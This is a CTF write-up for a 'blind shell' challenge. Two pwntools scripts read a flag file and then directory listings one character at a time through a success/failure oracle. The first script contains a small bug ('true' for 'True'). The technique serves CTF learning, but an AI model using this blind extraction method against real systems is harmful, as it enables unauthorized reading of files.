# blind_shell_writeup
`It's simple enough, either you've succeeded or you've failed.
Connect here: nc tasks.kksctf.ru 30010`

Connecting with netcat we're presented with a blind shell accepting only certain commands and responding either with "Success!" or "Failure!". So we thought about a blind attack to try to read the content of the file flag.txt with the bash command `[ $(head -c 1 flag.txt | tail -c 1) = 'a' ]` by incrementing the number of characters read everytime. The script worked like this
```
from pwn import *
import string

payload = "[ $(head -c {} flag.txt | tail -c 1) = '{}' ]"

r = remote("tasks.kksctf.ru", 30010)
r.recvuntil("$")
flag = ""
i = len(flag) + 1
found = False
while True:
    for l in string.printable:
        found = False
        r.sendline(payload.format(i, l))
        if b"Success" in r.recvuntil("$"):
            i = i+1
            flag += l
            found = true
            print("[+] Char found! {}".format(flag))
            break
    if not found:
        flag += " "
        i += 1
```
Unfortunately the flag wasn't there. So we stared looking around with ls using the same technique

```
from pwn import *
import string

payload = "[ $(ls | head -c {} | tail -c 1) = '{}' ]"

r.recvuntil("$")
flag = ""
i = len(flag) + 1
found = False
while True:
    for l in string.printable:
        found = False
        r.sendline(payload.format(i, l))
        if b"Success" in r.recvuntil("$"):
            i = i+1
            flag += l
            found = True
            print("[+] Char found! {}".format(flag))
            break
    if not found:
        flag += " "
        i+=1
 ```
We find another file called `maybehere` but reading it doesn't work because it's a directory! So we cd in it and surely the flag is inside. You can check out the final working script in the repo. Finally the flag `kks{Bl1nD_sH311_s2cKs_b4t_Y0U_ar3_amaz19g}`
